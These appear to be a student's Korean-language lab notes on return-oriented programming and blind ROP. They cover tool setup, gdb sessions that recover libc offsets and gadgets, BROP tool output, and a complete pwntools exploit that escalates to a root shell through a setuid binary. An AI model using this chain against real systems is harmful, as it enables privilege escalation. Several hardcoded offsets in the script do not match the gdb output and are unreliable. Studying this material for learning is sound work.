libc의 베이스 주소가 중요함


pop rdx는 ROPgadget을 통해 찾음
```sh
ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.23.so | grep "pop rdx ; pop rsi"
```

libcbase 구하는 코드가 가장 중요함


ubuntu24 -> pwndbg
1. 일반사용자 추가
sudo adduser s100041004
sudo vi /etc/sudoers
2. pwndbg 설치
get clone https://github.com/pwndbg/pwndbg.git
cd pwndbg
./setup.sh 
3. nano ~/.gdbinit -> peda를 죽임
sour ~/peda/peda.py 를 주석처리하고 source /home/s20011705/pwndbg/gdbinit.py 추가

ROPgadget, nasm, pwntools 설치
```
sudo apt-get install python3-pip
sudo pip3 install ropgadget
sudo apt-get install nasm
sudo apt-get install python3-setuptools
pip3 install pwntools
```

```sh
gcc -fno-stack-protector -o rop rop.c -ldl
sudo chown root:root ./rop
sudo chmod 4755 ./rop
```

### ubuntu 16
sudo rm /var/lib/dpkg/lock
sudo dpkg --configure -a
sudo apt install git

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```


sudo apt-get install python-pip
pip install pip == 20.3.4
sudo pip install ropgadget
sudo apt-get install nasm
sudo apt-get install python-setuptools
sudo pip install pwntools

```sh
gcc -fno-stack-protector -o rop rop.c -ldl
sudo chown root:root ./rop
sudo chmod 4755 ./rop 
```

gdb-peda$ i r rsp
rsp            0x7ffff1fdfd48   0x7ffff1fdfd48
gdb-peda$ x/gx 0x7ffff1fdfd48
0x7ffff1fdfd48: 0x00000000004007d0

gdb-peda$ i r rsi
rsi            0x7ffff1fdfd00   0x7ffff1fdfd00

gdb-peda$ p/d 0x7ffff1fdfd48 - 0x7ffff1fdfd00
$1 = 72

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7f02a9b55e57 --> 0x68732f6e69622f ('/bin/sh')

gdb-peda$ info proc map
process 77188
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/s20011705/rop
            0x600000           0x601000     0x1000        0x0 /home/s20011705/rop
            0x601000           0x602000     0x1000     0x1000 /home/s20011705/rop
           0x10d1000          0x10f2000    0x21000        0x0 [heap]
      0x7f02a99c9000     0x7f02a9b89000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f02a9b89000     0x7f02a9d89000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f02a9d89000     0x7f02a9d8d000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f02a9d8d000     0x7f02a9d8f000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f02a9d8f000     0x7f02a9d93000     0x4000        0x0
      0x7f02a9d93000     0x7f02a9d96000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f02a9d96000     0x7f02a9f95000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f02a9f95000     0x7f02a9f96000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f02a9f96000     0x7f02a9f97000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
      0x7f02a9f97000     0x7f02a9fbd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f02aa1a2000     0x7f02aa1a6000     0x4000        0x0
      0x7f02aa1bc000     0x7f02aa1bd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f02aa1bd000     0x7f02aa1be000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f02aa1be000     0x7f02aa1bf000     0x1000        0x0
      0x7ffff1fc1000     0x7ffff1fe2000    0x21000        0x0 [stack]
      0x7ffff1fed000     0x7ffff1fef000     0x2000        0x0 [vvar]
      0x7ffff1fef000     0x7ffff1ff1000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ p/x 0x7f02a9b55e57 - 0x7f02a99c9000
$2 = 0x18ce57 << /bin/sh의 offset 


gdb-peda$ p printf
$5 = {<text variable, no debug info>} 0x7f02a9a1e810 <__printf>
gdb-peda$ p system
$6 = {<text variable, no debug info>} 0x7f02a9a0e3a0 <__libc_system>
gdb-peda$ p setresuid
$7 = {<text variable, no debug info>} 0x7f02a9a965f0 <__GI___setresuid>

gdb-peda$ p/x 0x7f02a9a1e810 - 0x7f02a99c9000
$10 = 0x55810
gdb-peda$ p/x 0x7f02a9a0e3a0 - 0x7f02a99c9000
$11 = 0x453a0
gdb-peda$ p/x 0x7f02a9a965f0 - 0x7f02a99c9000
$12 = 0xcd5f0


gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400843 : (b'5fc3')  pop rdi; ret
gdb-peda$ ropsearch "pop rsi"
Searching for ROP gadget: 'pop rsi' in: binary ranges
0x00400841 : (b'5e415fc3')      pop rsi; pop r15; ret
gdb-peda$ ropsearch "pop rdx"
Searching for ROP gadget: 'pop rdx' in: binary ranges
Not found

s20011705@ubuntu:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.23.so | grep "pop rdx ; pop rsi"
0x00000000001151c9 : pop rdx ; pop rsi ; ret

```python
from pwn import *
from struct import *

#context.log_level = 'debug'

#64bit OS - /lib/x86_64-linux-gnu/libc-2.23.so
libcbase_printf_offset = 0x55800
libcbase_system_offset = 0x45390
libcbase_setresuid_offset = 0xcd570

binsh_offset = 0x18cd57

pop_rdi_ret = 0x400843
pop_rsi_ret = 0x400841
pop_rdx_ret_offset = 0x1150c9

r = process('./rop')

r.recvn(10)
r.recvuntil('Printf() address : ')
libcbase = int(r.recvuntil('\n'),16)
libcbase -= libcbase_printf_offset

payload = "A"*72
payload += p64(pop_rdi_ret) # pop rdi
payload += p64(0)
payload += p64(libcbase + pop_rdx_ret_offset) # pop rdx; pop rsi; ret
payload += p64(0)
payload += p64(0)
payload += p64(libcbase + libcbase_setresuid_offset)

payload += p64(pop_rdi_ret) # pop rdi랴
payload += p64(libcbase + binsh_offset)
payload += p64(libcbase + libcbase_system_offset)

r.send(payload)

r.interactive()
```

![[Pasted image 20251107013047.png]]
`exploit.py` 실행 후 본래 셸로 되돌아갈 때 왜 exit을 세 번이나 실행해야할까...?

https://man7.org/linux/man-pages/man2/setresuid.2.html
https://starseeker711.tistory.com/176
https://dokhakdubini.tistory.com/298
https://kaspyx.tistory.com/100
https://yi-barrack.tistory.com/18?category=1137120
https://g-idler.tistory.com/57
https://calvinjmkim.tistory.com/28
https://skysquirrel.tistory.com/26
https://sjlim5092.tistory.com/26


# BROP
sudo apt-get install socat

```sh
s20011705@ubuntu:~$ python check_overflow.py 
[*] Overflow size : 72
[+] Searching for Stop gadget : Done
[*]  Progressed to 0x100
[*]  Progressed to 0x200
[*]  Progressed to 0x300
[*]  Progressed to 0x400
[*]  Progressed to 0x500
[*] Stop address: 0x4005c0
s20011705@ubuntu:~$ 
```

```
[+] BROP Gadget : 0x4007ba
[+] RDI Gadget : 0x4007c3
```

```
s20011705@ubuntu:~$ python find_puts_addr.py 
[+] Searching for the address of puts@plt: Done
[*] Progressed to 0x100
[*] Progressed to 0x200
[*] Progressed to 0x300
[*] Progressed to 0x400
[*] Progressed to 0x500
[+] find puts@plt addr: 0x400555
s20011705@ubuntu:~$ 
```

```
s20011705@ubuntu:~$ r2 -n -B 0x400000 memory.dump
 -- You haxor! Me jane?
[0x00000000]> pd 10 @ x555
ERROR: Invalid tmpseek address 'x555'
ERROR: Invalid command 'pd 10 @ x555' (0x70)
[0x00000000]> pd 10 @ 0x555
       ╎╎   0x00000555      00ff           add bh, bh
       ╎╎   0x00000557      25b40a2000     and eax, 0x200ab4
       ╎╎   0x0000055c      0f1f4000       nop dword [rax]
       ╎╎   0x00000560      ff25b20a2000   jmp qword [0x00201018]      ; [0x201018:8]=-1
       ╎╎   0x00000566      6800000000     push 0
       └──< 0x0000056b      e9e0ffffff     jmp 0x550
        ╎   0x00000570      ff25aa0a2000   jmp qword [0x00201020]      ; [0x201020:8]=-1
        ╎   0x00000576      6801000000     push 1
        └─< 0x0000057b      e9d0ffffff     jmp 0x550
            0x00000580      ff25a20a2000   jmp qword [0x00201028]      ; [0x201028:8]=-1
[0x00000000]> 
```

```
s20011705@ubuntu:~$ python leak_address.py 
[*] Address of puts in libc : 0x7f732dbf56a0
```

```
s20011705@ubuntu:~/libc-database$ ./find puts 6a0
/lib/x86_64-linux-gnu/libc-2.23.so (local-eb4e85135a8dfe60c1f5bfb704b1e5cfde24a0b8)
s20011705@ubuntu:~/libc-database$ ls
add  common  db  download  dump  find  get  identify  libs  LICENSE.md  README.md  searchengine
s20011705@ubuntu:~/libc-database$ cd ../
s20011705@ubuntu:~$ ls
brop             brop.py            find_brop_gadget.py  leak_address.py  libc_search.py   memory_dump.py         peda-session-rop.txt  rop.c
brop.c           check_overflow.py  find_puts_addr.py    libc-database    memory.dump      peda                   radare2               run.sh
brop_exploit.py  exploit.py         find_stop_gadget.py  LibcSearcher     memory_dump2.py  peda-session-brop.txt  rop                   snap
s20011705@ubuntu:~$ cd libc-database/
s20011705@ubuntu:~/libc-database$ ./dump local-eb4e85135a8dfe60c1f5bfb704b1e5cfde24a0b8
offset___libc_start_main_ret = 0x20840
offset_system = 0x00000000000453a0
offset_dup2 = 0x00000000000f7a70
offset_read = 0x00000000000f7350
offset_write = 0x00000000000f73b0
offset_str_bin_sh = 0x18ce57
s20011705@ubuntu:~/libc-database$ 
```

```
s20011705@ubuntu:~/libc-database$ ./dump local-eb4e85135a8dfe60c1f5bfb704b1e5cfde24a0b8 puts
offset_puts = 0x000000000006f6a0
s20011705@ubuntu:~/libc-database$ 
```

```
s20011705@ubuntu:~$ python libc_search.py 
Multi Results:
 0: archive-old-eglibc (id libc6_2.12.1-0ubuntu10.4_amd64)
 1: archive-old-glibc (id libc6_2.19-10ubuntu2.3_i386)
 2: archive-eglibc (id libc6_2.15-0ubuntu10_i386)
Please supply more info using 
    add_condition(leaked_func, leaked_address).
You can choose it by hand
Or type 'exit' to quit:0
[+] archive-old-eglibc (id libc6_2.12.1-0ubuntu10.4_amd64) be choosed.
[*] libc base : 0x7f732db8b650
[*] system : 0x7f732dbcd3b0
[*] binsh : 0x7f732dcd2b26
s20011705@ubuntu:~$ 
```